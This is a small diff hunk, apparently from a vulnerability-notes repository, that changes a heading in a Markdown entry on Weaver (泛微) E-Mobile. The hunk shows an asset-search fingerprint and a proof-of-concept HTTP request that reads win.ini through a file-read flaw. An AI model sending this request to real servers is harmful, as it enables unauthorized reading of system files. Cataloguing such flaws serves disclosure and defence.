@@ -8,7 +8,7 @@
 app="泛微-EMobile"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /client/cdnfile/1C/Windows/win.ini?windows HTTP/1.1
